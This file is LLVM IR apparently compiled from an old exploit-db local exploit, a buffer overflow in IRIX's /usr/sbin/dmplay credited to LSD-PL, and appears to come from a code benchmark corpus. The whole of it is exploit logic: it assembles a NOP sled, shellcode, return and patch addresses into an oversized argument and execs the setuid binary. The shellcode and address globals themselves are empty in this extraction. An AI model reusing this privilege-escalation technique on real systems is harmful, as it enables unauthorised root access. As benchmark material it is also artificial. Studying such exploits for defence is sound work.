; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20128.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20128.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM oct 1997 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [57 x i8] c"/usr/sbin/dmplay for irix 6.2 6.3 IP:17,19,20,21,22,32\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"usage: %s {62|63} xserver:display\0A\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"62\00", align 1
@jump = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [3 x i8] c"63\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"DISPLAY=%s\00", align 1
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@shellcode = common dso_local global i32* null, align 8
@ADRNUM = common dso_local global i32 0, align 4
@TMPNUM = common dso_local global i32 0, align 4
@PCHNUM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [17 x i8] c"/usr/sbin/dmplay\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [10000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca [4 x i8], align 1
  %9 = alloca [4 x i8], align 1
  %10 = alloca i8*, align 8
  %11 = alloca [2 x i8*], align 16
  %12 = alloca [128 x i8], align 16
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %4, align 4
  %17 = icmp ne i32 %16, 3
  br i1 %17, label %18, label %24

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 -1) #3
  unreachable

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  %29 = icmp ne i32 %28, 0
  br i1 %29, label %55, label %30

30:                                               ; preds = %24
  %31 = load i64, i64* @jump, align 8
  %32 = inttoptr i64 %31 to i64 (...)*
  %33 = call i64 (...) %32()
  %34 = add i64 %33, 10396
  %35 = add i64 %34, 32
  %36 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %37 = bitcast i8* %36 to i64*
  store i64 %35, i64* %37, align 1
  %38 = load i64, i64* @jump, align 8
  %39 = inttoptr i64 %38 to i64 (...)*
  %40 = call i64 (...) %39()
  %41 = add i64 %40, 10396
  %42 = add i64 %41, 32
  %43 = add i64 %42, 900
  %44 = add i64 %43, 30540
  %45 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %46 = bitcast i8* %45 to i64*
  store i64 %44, i64* %46, align 1
  %47 = load i64, i64* @jump, align 8
  %48 = inttoptr i64 %47 to i64 (...)*
  %49 = call i64 (...) %48()
  %50 = add i64 %49, 10396
  %51 = add i64 %50, 32
  %52 = add i64 %51, 8000
  %53 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %54 = bitcast i8* %53 to i64*
  store i64 %52, i64* %54, align 1
  br label %55

55:                                               ; preds = %30, %24
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 1
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @strcmp(i8* %58, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0))
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %86, label %61

61:                                               ; preds = %55
  %62 = load i64, i64* @jump, align 8
  %63 = inttoptr i64 %62 to i64 (...)*
  %64 = call i64 (...) %63()
  %65 = add i64 %64, 10348
  %66 = add i64 %65, 32
  %67 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %68 = bitcast i8* %67 to i64*
  store i64 %66, i64* %68, align 1
  %69 = load i64, i64* @jump, align 8
  %70 = inttoptr i64 %69 to i64 (...)*
  %71 = call i64 (...) %70()
  %72 = add i64 %71, 10348
  %73 = add i64 %72, 32
  %74 = add i64 %73, 900
  %75 = sub i64 %74, 84
  %76 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %77 = bitcast i8* %76 to i64*
  store i64 %75, i64* %77, align 1
  %78 = load i64, i64* @jump, align 8
  %79 = inttoptr i64 %78 to i64 (...)*
  %80 = call i64 (...) %79()
  %81 = add i64 %80, 10348
  %82 = add i64 %81, 32
  %83 = add i64 %82, 8000
  %84 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %85 = bitcast i8* %84 to i64*
  store i64 %83, i64* %85, align 1
  br label %86

86:                                               ; preds = %61, %55
  %87 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %88 = load i8**, i8*** %5, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 2
  %90 = load i8*, i8** %89, align 8
  %91 = call i32 @sprintf(i8* %87, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0), i8* %90)
  %92 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %93 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  store i8* %92, i8** %93, align 16
  %94 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 1
  store i8* null, i8** %94, align 8
  %95 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  store i8* %95, i8** %10, align 8
  store i32 0, i32* %13, align 4
  br label %96

96:                                               ; preds = %110, %86
  %97 = load i32, i32* %13, align 4
  %98 = load i32, i32* @NOPNUM, align 4
  %99 = icmp slt i32 %97, %98
  br i1 %99, label %100, label %113

100:                                              ; preds = %96
  %101 = load i32*, i32** @nop, align 8
  %102 = load i32, i32* %13, align 4
  %103 = srem i32 %102, 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i32, i32* %101, i64 %104
  %106 = load i32, i32* %105, align 4
  %107 = trunc i32 %106 to i8
  %108 = load i8*, i8** %10, align 8
  %109 = getelementptr inbounds i8, i8* %108, i32 1
  store i8* %109, i8** %10, align 8
  store i8 %107, i8* %108, align 1
  br label %110

110:                                              ; preds = %100
  %111 = load i32, i32* %13, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %13, align 4
  br label %96

113:                                              ; preds = %96
  store i32 0, i32* %13, align 4
  br label %114

114:                                              ; preds = %128, %113
  %115 = load i32, i32* %13, align 4
  %116 = load i32*, i32** @shellcode, align 8
  %117 = call i32 @strlen(i32* %116)
  %118 = icmp slt i32 %115, %117
  br i1 %118, label %119, label %131

119:                                              ; preds = %114
  %120 = load i32*, i32** @shellcode, align 8
  %121 = load i32, i32* %13, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  %124 = load i32, i32* %123, align 4
  %125 = trunc i32 %124 to i8
  %126 = load i8*, i8** %10, align 8
  %127 = getelementptr inbounds i8, i8* %126, i32 1
  store i8* %127, i8** %10, align 8
  store i8 %125, i8* %126, align 1
  br label %128

128:                                              ; preds = %119
  %129 = load i32, i32* %13, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %13, align 4
  br label %114

131:                                              ; preds = %114
  %132 = load i8*, i8** %10, align 8
  %133 = getelementptr inbounds i8, i8* %132, i32 1
  store i8* %133, i8** %10, align 8
  store i8 -1, i8* %132, align 1
  store i32 0, i32* %13, align 4
  br label %134

134:                                              ; preds = %146, %131
  %135 = load i32, i32* %13, align 4
  %136 = load i32, i32* @ADRNUM, align 4
  %137 = icmp slt i32 %135, %136
  br i1 %137, label %138, label %149

138:                                              ; preds = %134
  %139 = load i32, i32* %13, align 4
  %140 = srem i32 %139, 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %141
  %143 = load i8, i8* %142, align 1
  %144 = load i8*, i8** %10, align 8
  %145 = getelementptr inbounds i8, i8* %144, i32 1
  store i8* %145, i8** %10, align 8
  store i8 %143, i8* %144, align 1
  br label %146

146:                                              ; preds = %138
  %147 = load i32, i32* %13, align 4
  %148 = add nsw i32 %147, 1
  store i32 %148, i32* %13, align 4
  br label %134

149:                                              ; preds = %134
  store i32 0, i32* %13, align 4
  br label %150

150:                                              ; preds = %162, %149
  %151 = load i32, i32* %13, align 4
  %152 = load i32, i32* @TMPNUM, align 4
  %153 = icmp slt i32 %151, %152
  br i1 %153, label %154, label %165

154:                                              ; preds = %150
  %155 = load i32, i32* %13, align 4
  %156 = srem i32 %155, 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %157
  %159 = load i8, i8* %158, align 1
  %160 = load i8*, i8** %10, align 8
  %161 = getelementptr inbounds i8, i8* %160, i32 1
  store i8* %161, i8** %10, align 8
  store i8 %159, i8* %160, align 1
  br label %162

162:                                              ; preds = %154
  %163 = load i32, i32* %13, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %13, align 4
  br label %150

165:                                              ; preds = %150
  store i32 0, i32* %13, align 4
  br label %166

166:                                              ; preds = %178, %165
  %167 = load i32, i32* %13, align 4
  %168 = load i32, i32* @PCHNUM, align 4
  %169 = icmp slt i32 %167, %168
  br i1 %169, label %170, label %181

170:                                              ; preds = %166
  %171 = load i32, i32* %13, align 4
  %172 = srem i32 %171, 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %173
  %175 = load i8, i8* %174, align 1
  %176 = load i8*, i8** %10, align 8
  %177 = getelementptr inbounds i8, i8* %176, i32 1
  store i8* %177, i8** %10, align 8
  store i8 %175, i8* %176, align 1
  br label %178

178:                                              ; preds = %170
  %179 = load i32, i32* %13, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %13, align 4
  br label %166

181:                                              ; preds = %166
  %182 = load i8*, i8** %10, align 8
  store i8 0, i8* %182, align 1
  %183 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %184 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %185 = call i32 @execle(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i8* %183, i32 0, i8** %184)
  %186 = load i32, i32* %3, align 4
  ret i32 %186
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
